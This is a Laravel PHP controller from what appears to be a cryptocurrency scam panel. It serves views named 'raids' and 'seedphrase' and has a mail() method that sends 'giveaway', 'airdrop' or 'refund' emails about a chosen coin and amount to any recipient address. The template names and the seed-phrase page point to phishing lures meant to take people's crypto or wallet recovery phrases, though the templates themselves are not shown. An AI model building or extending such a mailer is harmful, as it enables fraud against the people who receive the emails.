<?php

namespace App\Http\Controllers;

use App\Mail\CryptoMail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Validator;

class UserController extends Controller
{
    //




    // public function view()
    // {
    //     $user = auth()->user();
    //     if ($user->role == 'admin') {
    //         return redirect()->route('admin');
    //     } else {
    //         return view('user.dashboard', );
    //     }
    // }
    public function view()
    {
        $user = auth()->user();
        if ($user->role == 'admin') {
            return view('admin.dashboard');
        } else {
            return view('user.dashboard', );
        }
    }

    public function raids()
    {
        return view('user.raids');
    }


    public function sendmail()
    {
        return view('user.sendmail');
    }

    public function subscribe()
    {
        return view('user.subscribe');
    }
    public function seed()
    {
        return view('user.seedphrase');
    }


    public function mail(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'template' => ['required', 'in:giveaway,airdrop,refund'],
            'recipient_email' => ['required', 'email'],
            'crypto_type' => ['required', 'in:BTC,USDT,ETH,BNB,XRP,ADA,SOL,DOGE,DOT,AVAX,SHIB,LINK'],
            'quantity' => ['required', 'numeric', 'min:0.00000001'],
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        try {
            Mail::to($request->recipient_email)->send(new CryptoMail(
                $request->template,
                $request->crypto_type,
                $request->quantity
            ));

            return redirect()->route('user.sendmail')->with('success', 'Email sent successfully!');
        } catch (\Exception $e) {
            return back()->with('error', 'Failed to send email: ' . $e->getMessage())->withInput();
        }
    }
}
